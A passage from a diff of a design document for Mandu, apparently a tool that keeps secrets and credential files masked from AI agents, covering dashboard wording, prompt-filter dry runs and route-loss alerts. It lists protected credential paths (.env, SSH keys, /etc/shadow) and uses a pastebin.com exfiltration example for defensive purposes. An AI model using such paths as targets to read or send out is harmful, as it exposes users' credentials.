+  any request off this computer."; and the "why it was blocked" notes,
+  which the inspector's trace shares: "The mask stands for a value that
+  has changed since, …", "Mandu could not read a mask in it, …", "…which
+  no mask marks.", "The command would run a mask as code, and Mandu never
+  runs one.", "The request carried more masked values than Mandu checks
+  at once, …", "The program's shell had emptied the secret's mask …".
+  ("the mask" was already the page's noun: "got only the mask", "without
+  its mask".) Words only: no route, value, event, rule id
+  (`egress:shell-expanded-placeholder` keeps its name) or decision
+  changed. The inspector's own words ("It never left this machine", its
+  tiles) are out of scope, as are the terminal's and `mandu why`'s.
+  **The sweep reads these sentences with a real tokenizer.** The old one
+  paired single quotes across all of `home.js`, so an apostrophe in a
+  comment shifted the pairing and tripped it. `product-words.test.ts`
+  reads every string and template literal of `home.js` and the three
+  builders with the TypeScript compiler (`ts.createSourceFile`), skipping
+  only routing keys and rule ids, and builds session pages from recorded
+  sessions (the walkthrough fixture, the tour record) and checks every
+  card line, step, note, why and summary, so a sentence assembled from
+  parts is covered too. The person's and the AI's own words (a question, a
+  reply, a tool's result) are shown as written and are not swept. The
+  retired words live in one list, `test/unit/view-model/retired-words.ts`.
+- **Home, Rules and Approvals say "masked copy" and "this computer" too
+  (2026-10-27).** Their other sentence builders still said "placeholder"
+  and "this machine" where they show (a gated launch, an exposed control
+  plane, a reader rule, a rule change). Now: Home's posture card "Programs
+  the AI runs get a masked copy of each credential file, never the real
+  one.", "… a read fails instead of returning a masked copy.", "The AI sees
+  your secrets masked and a secret is sent out only where a rule or your OK
+  allows, …" and the partial-layer note "The mount layer still puts a
+  masked copy over each credential file, …" (§4.23); the exposure card
+  "those agents get masked copies of secret files" (§4.25x); *Where your
+  data lives* "the masked values the AI saw, …" and "it includes the real
+  values behind masked ones"; Rules' readers "(reads the masked copy)" and
+  "… so it reads the masked copy."; a rule change "In your prompts, … is
+  masked, as a short code the AI can still use" and "… is not on this
+  computer or a private network address". The chip's reason says "cannot
+  resolve masked values". The posture sentences are one text with the
+  launcher's (`POSTURE_SENTENCE`, copied byte for byte), so `mandu doctor`'s
+  posture line changes with them; the launcher's other terminal words
+  ("placeholder copies" in `mandu doctor`, the launch notices) are not the
+  dashboard's and stay. An attachment's own sentences (`GAP_SENTENCE`, an
+  OpenClaw plugin's, which `mandu serve` prints and the Plugins page shows)
+  were left then and changed on 2026-11-04: the
+  plugin's reads "The AI sees your secrets masked, because every model
+  call goes through Mandu. …" (the Plugins page's card, the session page's
+  and History's posture reason, `mandu serve status`), and a lost route's
+  "… the AI can read your secrets as they are, not masked.", as does
+  Home's lost-route card (`attachment-route.ts`, §4.25x1). Words only:
+  no route, value, event or decision changed.
+  `product-words.test.ts` sweeps these five builders' literals too, and
+  `attachment-route.ts`'s, checks the posture tables the page shows (each
+  posture's sentence, each partial-layer note and each gap's own sentence,
+  `GAP_SENTENCE`), and builds each card.
 - **A card has one subject, the AI.** The cells are *Why it stopped* /
   *What the AI has now* / *If you click Allow once or Always allow*.
   `describeAsk` (`view-model/ask-words.ts`, so the inspector's Approvals
@@ -15722,8 +20850,15 @@ key (retired by §4.25v), attributes and element ids were unchanged.
 
 **Tests.** `home-view-model.test.ts` (every family's cells with the AI as
 subject; the read family's exact sentences and that none says the AI reads
-the file; a sweep that no product string says *Inbox*, *locked file* or
-*placeholder*), `home-js-approvals.test.ts` (nav, heading, title, the
+the file; a sweep that no product string in `index.html` or the Home view
+model says *Inbox*, *locked file* or *placeholder*), `product-words.test.ts`
+(since 2026-10-25: `home.js` and the session page's builders, read by the
+compiler, and built session pages; also *this machine*; since 2026-10-27
+also Home's, Rules' and Approvals' builders, the posture tables, and a
+built exposure card, posture card, readers line and rule change),
+`secret-story.test.ts` (each card shape in the product's words), stack
+`tests/stack/block-why.test.ts` (the served session page's `#agent-secrets`
+and `#agent-story`, drawn in jsdom, say neither), `home-js-approvals.test.ts` (nav, heading, title, the
 waiting count equal to the badge, `<time>` and the year rule, the cells,
 the help button's ARIA and the mode-dependent sentence). Each package whose
 message was reworded updated its own test (`launcher/test/unit/why.test.ts`,
@@ -15748,9 +20883,9 @@ state.
 | `/` (also `/index.html`) | Home |
 | `/approvals`, `/approvals/<askId\|proposalId\|changeId>` | Approvals; with an id, that question, waiting rule change or *Rule changes* row marked and scrolled to (a request already approved: the change it made) |
 | `/rules`, `/settings` | Rules, Settings |
-| `/rules?file=<path>` | Rules with *Add a rule*'s file browser opened at that file (`~/…` or absolute), its row opened; replaced by `/rules` once used; a Your secrets card's or a scan finding's link (§4.25b *A card opens its file in Rules*, §4.25ai *A finding opens its file in Rules*) |
+| `/rules?file=<path>` | Rules with *Add a rule*'s file browser opened at that file (`~/…` or absolute), its row opened; replaced by `/rules` once used; a Your secrets card's link, a session page's *Protect it* or a scan finding's link (§4.25b *A card opens its file in Rules*, *Files the AI read as they were*, §4.25ai *A finding opens its file in Rules*) |
 | `/rules#answer-<id>` | Rules with the row of that remembered answer opened under *Your rules*, or a note that it is no longer kept; replaced by `/rules` once used (§4.25 Approvals, *A remembered answer opens where Rules keeps it*) |
-| `/agents/<sessionId>` | the agent page; `?ask=<askId>` marks the moment it was asked (§4.25h); `?go=blocked\|sent\|secrets` goes once drawn where that tile goes, or to *Your secrets*, and is replaced by the page's own address (§4.25 *A link that goes where a tile goes*) |
+| `/agents/<sessionId>` | the agent page; `?ask=<askId>` marks the moment it was asked (§4.25h); `?go=blocked\|sent\|secrets\|latest\|waiting\|not-applied` goes once drawn where that tile goes, to *Your secrets*, to the newest turn, to *Needs your OK*, or to *Changes Mandu did not apply to your files*, and is replaced by the page's own address (§4.25 *A link that goes where a tile goes*) |
 | `/dev/` (also `/dev/index.html`) | the inspector on its persisted page (`mandu.area`), else Sessions |
 | `/dev/sessions`, `/dev/drills`, `/dev/tests`, `/dev/approvals`, `/dev/rules`, `/dev/settings` | an inspector page (§4.32); `/dev/status`, `/dev/policy` and `/dev/inbox` are a 302 to `/dev/sessions`, `/dev/rules`, `/dev/approvals` |
 | `/dev/sessions/<id>`, `/dev/drills/<id>`, `/dev/tests/<id>` | that page, showing that session (a drill or test id under `/dev/sessions/` moves to its own page client-side); `?tab=secrets` / `files` / `checks` opens that tab (view state, §4.33; Trace, the default, is never written); `?ask=<askId>` marks the moment an approval was asked (§4.35), `?step=<stepId>` one step (§4.35) |
@@ -15826,7 +20961,7 @@ visible "Inbox" left in `dev/index.html` or egress.js), `index-html.test.ts`,
 While a launch with no wall around the arbiter's human-plane socket runs
 (`--mode off`, or `--no-net-guard` without the mount layer), the arbiter
 believes no guard or proxy report on that socket, so every confined session
-beside it gets placeholders, refused protected writes and masked shell
+beside it gets masked copies of secret files, refused protected writes and masked shell
 output (arbiter-human-plane.md §10.1). That stays: it fails closed. Both
 front-ends show it, with the launch that causes it and the fix
 (arbiter-human-plane.md §10.1.1 has the arbiter and launcher halves).
@@ -15847,14 +20982,19 @@ state, lists each launch, what the exposure costs, and the fix.
 
 **The product page.** `/api/home` carries `exposure` (`homeExposure`) only
 while exposed and the service is reachable: "Another agent can reach
-Mandu's own controls.", what happens to the other agents ("Your secrets
-stay protected; some work in those agents may fail."), one line per cause,
+Mandu's own controls.", what happens to the other agents ("… those agents
+get masked copies of secret files, their changes to protected files are
+blocked, and their command output is masked. Your secrets stay protected;
+some work in those agents may fail.", "masked copies" since 2026-10-27,
+§4.25u), one line per cause,
 when it began, and the fix ("Stop that agent, or start it again with the
 file guard on (without `--mode off` or `--no-net-guard`)."). The fix also
 comes as `fixParts`, the same words with the two launch flags as code parts
 (2026-10-08), and Home draws them as `<code>` (`textParts`, as the first-run
 card does, §4.25). Home shows it as an alert card (`#home-exposure`,
-`role="alert"`, text nodes only) until a poll has none. The Home verdict is unchanged (secrets stay guarded), and
+`role="alert"`, text nodes only) until a poll has none. With an attached
+OpenClaw the fix ends with `PLUGIN_EXPOSURE_FIX`, whose three commands
+each have a Copy (2026-10-28, #147; §4.25b); the launch flags do not. The Home verdict is unchanged (secrets stay guarded), and
 the copy passes the §4.18 vocabulary sweep. Since 2026-10-21 a person with
 notifications on also gets one when an exposure starts, once per exposure
 and in fixed words (§4.25 *Notifications*).
@@ -15877,6 +21017,18 @@ row has none either. A cause with no row keeps the old words, its session
 id as code; an unreadable launch record still reads "an agent Mandu could
 not name". The inspector's chip and drawer are unchanged.
 
+*A plugin session says so, and how to avoid it (2026-10-25, the maintainer's
+"weaken + warn", openclaw-plugin.md §3.2).* When the cause is an attachment
+(Mandu's plugin in a resident OpenClaw Gateway, registered by `mandu serve`),
+the launch flags fix nothing: the card reads "Your OpenClaw Gateway can reach
+Mandu's own controls.", its sentence says the plugin runs in the Gateway
+outside any file guard, and its fix says the plugin causes this for as long as
+it runs and how to avoid it: run the Gateway under Mandu (`mandu openclaw
+gateway`), or stop the service while using the other agents (`mandu serve
+stop`); `mandu openclaw uninstall` detaches it for good (the three commands as
+code parts). Beside an unwalled launch, the card keeps its own headline and
+carries both fixes.
+
 **Tests.** `test/unit/view-model/human-plane.test.ts` (each cause's parts
 and words, with and without a row, and through `buildHomeViewModel`),
 `test/unit/ui/home-js-home.test.ts` (the link opens the agent page in
@@ -15888,6 +21040,53 @@ unwalled launch runs beside a confined one and after it ends or its
 launcher dies; and, with the unwalled launch's posture event sent as
 run.ts sends it, `/api/home` from the real server names its agent and the
 served product page opens that agent's page from the link).
+
+#### 4.25x1 An attached Gateway's config no longer goes through Mandu: the route card
+
+*Built 2026-10-25* (openclaw-plugin.md §3.6). `mandu serve`'s proxy pool
+reads each attached OpenClaw session's config every 30 s and on every
+change, and when it no longer routes through Mandu (the Anthropic route
+elsewhere or gone, a model with its own endpoint, the Mandu plugin gone or
+off, the file unreadable) the arbiter records a believed `launch_posture`
+for the session with the lost coverage and an `attachmentRoute` (the
+problems in sentences, the config's path), sent on the dashboard's admin
+channel (arbiter-human-plane.md §10.1.2).
+
+**Where it comes from.** `deriveHealth` (session-health.ts) takes an
+attachment's NEWEST believed arbiter record (a launch keeps its first), so
+the session's posture follows the route: `gated` / `model-route-lost` and
+its sentence ("no longer sends every model call through Mandu") while the
+model context is lost, the kind's own once back; `health.attachmentRoute`
+carries the problems while lost, never from a claim. `homeRouteLost`
+(view-model/attachment-route.ts) projects every live session (not the
+window's: a route lost days ago is still lost) whose health carries one,
+and only while the human plane's status lists its attachment (an ended
+attachment's last record says nothing about now; an unknown status shows
+it anyway).
+
+**The product page.** `/api/home` carries `routeLost` only then: "Your
+OpenClaw Gateway's config no longer goes through Mandu.", a sentence with
+the honest limit (the Gateway keeps the config it loaded until it
+restarts; once it runs with this one, the AI can read your secrets as they
+are), one line per session (its id and the config's path as code parts,
+each problem, since when), and the fix as parts: `mandu openclaw install`,
+then `openclaw gateway restart`; Mandu never changes the config itself;
+`mandu openclaw uninstall` if the change was meant. Home draws it as an
+alert card (`#home-route-lost`, `role="alert"`, text nodes only) under the
+exposure card, until a poll has none. Each of the fix's three commands has
+a Copy (2026-10-28, #147; §4.25b); the session id and config path do not.
+The verdict is unchanged; the copy passes the §4.18 sweep. The agent's page shows the posture line from the
+same health (§4.23).
+
+**Tests.** `test/unit/view-model/attachment-route.test.ts` (the newest
+believed record wins, a claim never clears or raises it, the card while
+live, gone once routed or ended, through `buildHomeViewModel`, the sweep),
+`test/unit/ui/home-js-home.test.ts` (the card drawn as text, its commands as
+code, gone on the next poll without it),
+`test/unit/supervisor/attachment-pool.test.ts` (the pool's reports), and
+launcher/test/component/serve-route-check.test.ts (the real service: an
+edit to the config shows in the event stream and `mandu serve status`, and
+clears after `mandu openclaw install`).
 
 *Beside it: the secret posture card (2026-10-21).* Under the exposure card,
 Home draws `#home-posture` while the newest launch is `gated`: its
@@ -15904,9 +21103,10 @@ words.
 phase 4 (§11, §13.7): what Mandu does with what it finds in what the person
 types, chosen in Settings, and a plain line under the person's message when
 the filter changed part of it. Settings carries only the action per kind of
-finding and the exceptions list; the switches, packs, plugins and test
-bench stay in the inspector's Prompt filters panel (§4.31), linked as the
-developer view (`/dev/rules`).
+finding, the exceptions list and *Try a message* (the inspector bench's
+dry run on the person's own text, below); the switches, packs and plugins
+stay in the inspector's Prompt filters panel (§4.31), linked as the
+developer view (`/dev/rules`) where the build has one.
 
 **The section (`home.js loadPromptSettings`).**
 
@@ -15926,8 +21126,13 @@ developer view (`/dev/rules`).
   lets more through, so it is asked about first. Each reads as a sentence
   (*An exception reads as a sentence* below).
 - Every change is one typed edit; one that lets more reach the AI is asked
-  about first with the Models question (`modelConfirmText`), then resent
-  with what was shown. It applies to the next message, with Undo.
+  about first with the Models question, on the page under its row or in
+  the exception form (`confirmParts`; §4.25n *Settings and Let it through
+  ask on the page too*), then resent with what was shown by *Apply anyway*.
+  It applies to the next message, with Undo.
+- A choice made with an arrow key on the closed menu waits for Enter, and
+  Escape puts it back (§4.25 *A menu that saves at once waits for Enter
+  from the keyboard*).
 
 **An exception reads as a sentence** (2026-10-08). An exception row is the
 kind and its pattern as one sentence ("An email address matching
@@ -16001,13 +21206,95 @@ asks before such an exception), then with the administrator's lock on that
 kind (the reason names the lock, over "No exceptions."; the arbiter refuses
 the exception, naming the file), with the oracle.
 
+**Try a message** (2026-10-23, queue item #82). Under Exceptions a fold,
+*Try a message*, holds a text box ("Type or paste a message to see what
+Mandu would do with it") and **Try it**. Before it, the only place to check
+a choice or an exception without sending a real message to the AI, the
+very thing the filter guards, was the inspector's bench, and the developer
+view leaves the public build before launch. The fold says in one line that
+nothing is sent to an AI and nothing is kept: the text stays in the box.
+
+- *The route.* `POST /api/policy/prompt-filters/try {text}` mounts the
+  bench's own handler (`postPromptBench`, form `try`): the arbiter's
+  `filterPrompt` with `dryRun: true` on the HUMAN plane, which mints
+  nothing, stores nothing and records no event. The origin is always
+  `human` (the person's own message); one in the body is ignored. A POST, it
+  sits behind the global mutating gate (CSRF header AND admin session), as
+  the card's change does. It reads and writes no policy. The box's
+  `maxlength` is the bench's `BENCH_MAX_CHARS` (65,536).
+- *The answer* is `{enforcing, action, findings: [{start, end, category,
+  name, named, action}], reason?}`. Each kind is named in the card's words
+  (`kindName`, so `secret.shape.github-token` reads *A GitHub token*).
+  `reason` is the arbiter's own sentence for a filter that could not run.
+  The bench's `modelText`, symbols, `how` and digest are left out. The
+  refusals are the bench's statuses in the product's words: 400 "Type a
+  message to try.", 413 "The message is longer than 65,536 characters.",
+  501 (an arbiter predating the dry run), 502 "The protection service did
+  not answer." (never the arbiter's error, which could name a path), and 404
+  with no service. The page draws them with `refusalText`.
+- *The page* (`home.js wirePromptTry`, `drawPromptTry`) shows the typed text
+  again with each found span marked (`<mark class="prompt-try-mark">`, from
+  `start`/`end` into the text it sent). Under it is one line per finding:
+  the kind, then what would happen ("hidden. The AI would get a short code
+  in its place.", "removed …", "held. The message would wait for your
+  answer.", "blocked …", "sent as written. Mandu would only note it."). No
+  finding: "Nothing in it would be held or masked." Protection off adds
+  "Protection is off, so Mandu would only note these." With an exception in
+  force the answer ends "What matches one of your exceptions is not marked:
+  it goes to the AI as you wrote it." The fold is hidden while the card is
+  unread, as Exceptions is. An older answer that arrives after a newer try
+  is dropped. Every server string is drawn as text.
+- *The answer follows the card* (2026-10-30, queue item #255). The fold
+  exists to check a change, so its answer must not contradict the card
+  right after one. While an answer is drawn, every read of the card that
+  draws it (`loadPromptSettings`: a kind's menu, *Use the default*, an
+  exception's Add or Remove, the notice's Undo, a Cancel, Settings opened
+  again) asks the try route again (`promptTryAgain`) for **the text that
+  answer is about**: kept in page memory when Try it drew it, never in
+  storage, and not the box's current value, which may have been edited
+  since. The new answer replaces the old one in place: Try it is not
+  disabled, nothing says it is busy, and the focus does not move; the
+  answer box is `role="status"`, so a screen reader hears it once. No answer
+  drawn (none yet, an empty box, a refusal) or an unread card: nothing is
+  asked, so a re-ask is never per poll. A re-ask that fails keeps the old
+  answer and adds one line, "This answer is from before your last change.
+  Press Try it to check again.", never a refusal in red for a read the
+  person did not ask for (signed out, for one). The shared sequence drops an
+  older answer and lets a press during a re-ask win; a change while a press
+  is out is not asked about until that press answers, then once (its
+  request may predate the change), so Try it is never left disabled.
+  Ctrl+Enter (⌘+Enter on a Mac) in the box presses Try it, as in Rules ›
+  Describe; Enter alone still adds a line, and an IME composition's Enter
+  is left alone. Since 2026-11-03 (queue item #294) a restart of the
+  protection service on or off reads the card too, at the Home poll that
+  sees it (§4.25 *The on/off says what runs*), so the answer's "Protection
+  is off, so Mandu would only note these" follows the Protection switch
+  once the service runs what it saved.
+- *Why the person's text, not the model's.* The model's text holds `$MDU:`
+  symbols (in a dry run `$MDU:<would-mint>`, or a registered secret's real
+  symbol), which mean nothing to the person and are not product copy.
+  Marking spans of what they typed answers the question they asked ("what
+  in this would Mandu touch?") without a symbol on the page.
+- *What an exception lets through is not listed.* The arbiter's answer
+  drops a finding whose action is `pass` (an exception, a kind set to send
+  as written; `arbiter/prompt-filter/engine.ts` `segment`), so the page
+  cannot name the exception that let a span through. It shows the span
+  unmarked and says, under the answer, that an exception's matches are not
+  marked. Naming the exception would take a change to the arbiter's answer.
+- *Probing.* A dry run tells whoever holds the admin session which patterns
+  match. That is what the inspector's bench offers behind the same session,
+  and less than the Exceptions list, which shows the patterns themselves.
+
 **The note under your message (`home.js promptNoteNode`).** On the agent
 page, under "You asked", one line per outcome ("One value in your prompt
 was hidden from the AI (an email address).", "Your message was not sent to
 the AI: it holds a card number."). Per finding: **Show what was hidden**
 (fetches the original, shown as text; it keeps the keyboard focus through
 its request, §4.25b *Show the real value keeps the focus*) and **Let it through in this
-message / for this session** (asked first). A message the filter blocked
+message / for this session** (asked first, in the finding's row: "Let
+`<what>` through in this message? …", with *Let it through* and Cancel,
+never a browser dialog; §4.25n *Settings and Let it through ask on the page
+too*). A message the filter blocked
 is its own card, placed in the story by time. The answer to a let-through
 (its line, or a refusal's words) stays on its row when the page is drawn
 again, until the agent's next request records it (§4.25 *The poll keeps
@@ -16033,6 +21320,8 @@ and the arbiter still refuses.
     POST /api/policy/prompt-filters/change         {edit, expected?}
       → {applied: false, confirm: true, expected, rows, wouldLet}
       → {applied: true, changeId}
+    POST /api/policy/prompt-filters/try            {text}
+      → {enforcing, action, findings: [{start, end, category, name, named, action}], reason?}
     GET  /api/home/agent?session=                  each story turn's `promptNote`, the page's `unplacedNotes`
     POST /api/prompt-filters/reveal                {session, eventId, index} → {original}
     POST /api/prompt-filters/let-through           {session, eventId, index, scope}
@@ -16095,7 +21384,10 @@ and the arbiter still refuses.
 real arbiter and the real anthropic-proxy: a choice in force on the next
 request, a lock refused naming the file, the note and its let-through, an
 exception asked first, the excepted messages' notes clearing, no found
-value in `/api/home` or the agent page) and its Codex twin
+value in `/api/home` or the agent page; *Try a message* marks an address
+and a registered secret, an exception unmarks the address, and the try
+leaves the symbol table and the event logs as they were, with a real run
+of the filter as the positive control) and its Codex twin
 `tests/stack/dashboard-prompt-settings-codex.test.ts` (the real
 openai-proxy on the Responses wire). The clearing event: each proxy's
 `test/unit/prompt-event-ledger.test.ts` and
@@ -16150,10 +21442,78 @@ not ask*).
 
 The page offers no switch: a switch would need a policy-edit op for
 `issuer_bindings`, which the arbiter does not have (the change is
-policy.yaml text). The item spans both columns of the list. The table is a
-display copy of the arbiter's `ISSUERS` (id, name, hosts): the dashboard does
-not import the arbiter, so `tests/stack/issuer-table-parity` keeps the copy
-and `issuerState` equal to the arbiter's.
+policy.yaml text). The item is the list's last. The table is a
+display copy of the arbiter's `ISSUERS` (id, name, hosts; compiled from one
+file per issuer in `arbiter/policy/issuers/`, confidentiality.md §2.3, so a
+new issuer's file adds its row here too): the dashboard does not import the
+arbiter, so `tests/stack/issuer-table-parity` keeps the copy and
+`issuerState` equal to the arbiter's.
+
+**Which files (2026-10-26).** "Keys and secret files reach the AI masked"
+never said which files count as secret files with no rule of the person's;
+the file browser answered one file at a time ("Built in: environment
+files"), and "is my `~/.npmrc` covered?" had no answer on the page. In the
+`secrets` and `full` modes that item now holds a closed **Which files** fold
+(`details.more`, drawn like Which companies), every name as code. The home
+says where it opens (`HomeBuiltIn.filesAt`, the index of that item; null in
+the other modes). The lists are about 4 KB of fixed copy, and the home is
+polled on every page and was within a few hundred bytes of its budget
+(§4.30 *Payload budgets*), so the polled home leaves them out: the Rules page reads
+them once from the same route, `GET /api/home?files=1` (`HomeBuiltIn.files`,
+only where `filesAt` is set; no new route, the same read gate), keeps them
+for the page's life, and draws the card again. A read that fails leaves the
+card as it was, with no empty fold. An older server sends no `filesAt`, and
+the card is drawn as before. The fold holds:
+
+- **Named like this, in any folder:** one row per basename shape of the
+  catalog, in the words the file browser uses (one set:
+  `BUILTIN_RULE_WORDS`), with example names: "Environment files: `.env`,
+  `.env.*`, `*.env`, `.envrc`", "SSH keys: `id_rsa`, …", "Terraform state:
+  `*.tfstate`, `*.tfstate.backup`". A shape with a limit says it: credential
+  files "(not program source or documentation pages)", a tool's saved
+  sign-in "(in a tool's own folder)". Then "Templates are left out:
+  `.env.example`, `secrets.example.json`".
+- **These places in your home folder (N places):** every home-folder
+  prefix of the catalog, one wrapped run of code chips; then the four
+  system files (`/etc/shadow`, …) on a line of their own, since they are not
+  in the home folder; "In `~/.ssh`, its public files are not: `*.pub`,
+  `known_hosts`, `authorized_keys`, `allowed_signers`."; "And the same
+  stores in a Windows profile, under WSL." (the `~/AppData/…` and `~/_netrc`
+  entries, never listed one by one); "And OpenCode's and Goose's own data,
+  wherever it is kept." (`shape:opencode-data`, `shape:goose-data`).
+- The content tier, on by default in these modes (secret-discovery.md §2.6,
+  §2.7): "Mandu also keeps secret a settings file it found a saved password
+  or key in, and a personal document it recognised, such as a bank
+  statement or a lab report. It looks for these when an agent starts."
+- "To make one of these readable by the AI, give it a rule of your own
+  under Your rules: your rules are checked first.", Your rules a link to
+  that card (`/rules#your-rules`, the section link's address; a click
+  scrolls to `#rules-block` as the section link does). The page offers no
+  switch.
+
+The fold's list of kinds keeps two columns, as Which companies does. The lists are a
+display copy of the arbiter's catalog (`view-model/builtin-files.ts`:
+`SECRET_PREFIXES` with fs-outbound's `SENSITIVE_PATHS`, the basename shapes,
+the agents' data shapes), for the same reason as the issuer table, kept by
+`tests/stack/builtin-files-parity`: the places are `SECRET_PREFIXES` in
+order (home folder, system files, Windows profile); each example name of
+each kind, under a temp folder, gets that kind's rule from
+`secretPathConfidentiality`; a name built from each of the arbiter's own
+name anchors (`catalogNameAnchors`, which every shape must have) is probed,
+so a new shape fails the test until the copy names it; the template names
+and `~/.ssh`'s public files stay public. The fold claims nothing about what
+programs may read (the posture note covers that).
+
+**One list, read top to bottom (2026-10-29).** The card's list was a
+two-column `.plain-list` wider than 760 px, with the files and issuer items
+across both columns: the Secrets mode's three sentences read left to right
+and down, and before the Which files lists were read the third, "Untrusted
+content is not masked in this mode", sat beside an empty cell, the one
+sentence that says what Mandu does not do looking like leftover space. Now
+`#builtin-list` is one column at every width, its items in source order down
+the card's width (the page's column is at most 1040 px, so no `72ch` cap: a
+cap would squeeze the open folds). The folds' own lists, of kinds and of
+companies, keep two columns.
 
 **Tests.** `home-view-model.test.ts` (Secrets mode never claims masking and
 says so; Full and Injection keep the sentence; Off and unknown claim
@@ -16162,11 +21522,20 @@ product vocabulary sweep; the issuer item is in Secrets and Full only) and
 `home-js-rules.test.ts` (the page paints the server's list for each mode;
 the HTML's list is empty; a failed home claims nothing; the issuer fold
 lists each company with its hosts as code; the off and unread items draw
-their words). `issuer-words.test.ts` (each state and its words),
-`tests/stack/issuer-table-parity` (the copy against the arbiter) and
+their words; the Which files fold is closed, lists the kinds and the places
+with each name as code, links Your rules, and an older server's home draws
+the card as before; the lists are read once, and a failed read draws no
+fold; the list is one column at every width and the folds' lists two). `issuer-words.test.ts` (each state and its words),
+`builtin-files.test.ts` (the copy is well formed, the file browser reads its
+words, the vocabulary sweep), `tests/stack/issuer-table-parity` and
+`tests/stack/builtin-files-parity` (the copies against the arbiter) and
 `tests/stack/rules-issuer-bindings` (a real arbiter with `issuers_off:
 [stripe]`, `false` and none; `/api/home` and the served Rules page carry
-names, never the key's value).
+names, never the key's value; `filesAt` in the polled home, the lists only
+with `?files=1`, and the drawn Which files fold), and
+`tests/stack/rules-builtin-one-column` (in a headless Chromium at 1280 and
+900 px, folds closed and open: every item at one left edge, each below the
+one before, the card's width; the folds' lists two columns).
 
 #### 4.25aa Rules page: who may get your secrets, per program, host and AI (2026-10-11)
 
@@ -16211,7 +21580,7 @@ toggle would hide where a change is made.
 |---|---|---|---|
 | Programs | program a `readers:` entry names (an interpreter with its pinned script is its own program, "python3 running ~/proj/report.py") | only where it differs from *Any other program* (*Only what differs* below): *Opens the real file* (each with "checked by Mandu" or "your word", the §4.25p words), *Never gets the real file: it prints or runs what it reads*, and *Gets a masked copy* only where any other program is refused; then "The rest (4): as any other program, below.", or "Everything: as any other program, below." when nothing differs | *Any other program*: *Gets a masked copy* where a rule has no list or `others: twin`, else *Refused* |
 | Hosts | host on a secret rule's `bindings` | *Gets the real value without asking* | *Any other host*: "No secret goes there without a rule or your OK.", and the Not secret files, which may go anywhere |
-| AI | *Any AI* ("Your agent's AI and Mandu's helper. Your AI provider gets what they read."), then each declared `local: true` model ("Your own AI, on this computer.") | *Reads it as written* (`public`), *May read it when it asks* (`any-model`; for your own AI `local-model` too), *Always sees it masked* (the rest) | none; with `local-model` rules and no own AI declared, a *Your own AI* row says none is listed, so no AI reads them |
+| AI | *Any AI* ("Your agent's AI and Mandu's helper. Your AI provider gets what they read."), then each declared `local: true` model ("Your own AI, on this computer.") | *Reads it as written* (`public`), *May read it when it asks* (`any-model`; for your own AI `local-model` too), *Always sees it masked* (the rest); your own AI lists only what differs from *Any AI* (*Only what differs* below), then "The rest (5): as Any AI, above.", or "Everything: as Any AI, above." when nothing differs | none; with `local-model` rules and no own AI declared, a *Your own AI* row says none is listed, so no AI reads them |
 
 Each list is a set of paths (`~` for the dashboard's home), with "and
 everything inside" or "every matching file" for a folder or pattern (a rule
@@ -16244,8 +21613,23 @@ exactly what *Any other program* gets for that file, and the card grew as
 programs × files (879 px tall at 1280 px). Each file is still listed once
 per outcome in the tab: the closing row and its words are unchanged, and a
 reader who wants everything one program gets reads its row and the one
-below, which the rest line names and counts. The Hosts and AI tabs are
-unchanged.
+below, which the rest line names and counts. The Hosts tab is unchanged.
+
+The AI tab does the same for your own AI (queue item #98, 2026-10-23): a
+declared `local: true` model's row lists only the files whose group differs
+from the one *Any AI*'s row puts them in (today the `local-model` files,
+under *May read it when it asks*), then "The rest (5): as Any AI, above.",
+or "Everything: as Any AI, above." when nothing differs (no `local-model`
+rule). The view model builds the own model's full lists as before and
+drops each file that *Any AI* lists under the same group, compared file by
+file, counting them (`BY_WHO_WORDS.sameAsAnyAI` / `allAsAnyAI`); which
+files a model may read is not recomputed. The page draws the line from
+`rest` as it does for a program. Why: the own model's row repeated *Any
+AI*'s lists (every public file, every `any-model` and `no-model` file), so
+a person with twenty public files read forty names to find the one group
+that only their own model may read. *Any AI* keeps its full lists, and the
+*Your own AI* row shown when none is declared (its masked `local-model`
+files) is unchanged.
 
 **Server (`view-model/rules-by-who.ts`, `server/by-who-routes.ts`).** `GET
 /api/policy/by-who` → `{byWho}` (read gate: open; paths, program names,
@@ -16265,9 +21649,42 @@ service, an older one): `available: false`, and the card stays hidden (Your
 rules already says the rules could not be read); the page labels
 unreadable: `partial: true`, and the card says the lists may miss files.
 
+**An empty list that could not read every rule says so (2026-10-28).** With
+the page labels unread (`partial: true`: a dashboard without the service's
+controls, as the docs' tour runs it, or a failing confidentiality read), a
+tab with no rows said "No rule of yours makes a file secret yet." over a
+note saying some rules could not be read: a claim the page could not make,
+shown exactly when nothing had been read. Such a tab now reads "No rule in
+policy.yaml makes a file secret. The rules made on this page could not be
+read, so they are not listed here.", and its note drops its own "Some rules
+… could not be read" sentence, so it is said once; the tab's own note stays.
+With rows, or with every rule read, nothing changes. Display only
+(`home.js` `renderByWho`, `BY_WHO_EMPTY_PARTIAL`).
+
+**A rule on nothing says so here too (2026-10-28, queue item #225).** Your
+rules marks a rule whose path has nothing on this computer (§4.25f *A rule
+on nothing says so*), but this card listed the same rule plainly: "Any other
+program · Gets a masked copy: `~/shop/.evn`", the misspelt file read as a
+kept one while the real `~/shop/.env` had no rule, the very reading the
+§4.25f line was made to remove. Now, on every tab, such a file reads
+"`~/shop/.evn` (nothing at this path)" after its name and its reach, and its
+button's name ends the same way ("Show the rule for ~/shop/.evn in Your
+rules (nothing at this path)"); *Check a host* adds the same words after the
+file's name in its answer. A value of such a file ("~/app/.env: STRIPE_KEY")
+is marked as its file is. The words are the card's grey `by-who-more`, no
+colour and no icon, never a warning: a rule made before its file is fine.
+The button still opens the rule under Your rules, where the full sentence
+explains it. The page reads its own Your rules flag (`home.js`
+`missingRule`: the item's `rule` through `treeRule`, then `ruleMissing`), so
+there is no new server read: a pattern is never marked, nor a file whose
+rule has no row under Your rules (the page does not know), and since the
+card is drawn again after Your rules, the mark goes once something appears
+at the path. Display only.
+
 **Not covered.** The built-in protections (the catalog of credential files)
-and your answers are not in the lists; the Hosts note says an answer may add
-a place.
+and your answers are not in the lists: Built-in protections names the
+catalog's files under Which files (§4.25z), and the Hosts note says an
+answer may add a place.
 
 **Per value (2026-10-11, plan 13 §5.2).** A rule with `values:` sends each
 value to its own hosts, so a host row names the value, "~/ws/app/.env:
@@ -16277,23 +21694,190 @@ only a host where the whole file may go (every value and the file allow
 it, the snapshot's `wholeBindings`) lists the file itself. Test:
 `rules-by-who.test.ts` ("per host, plan 13 §5.2").
 
+**Check a host (2026-10-25).** The lists name only the hosts a file rule
+already names, and say nothing of a host no rule names: what would happen
+if the agent sent something to `pastebin.com`? `mandu why <host>` answers
+it from the terminal; the card answers it too. Under its lists, a small
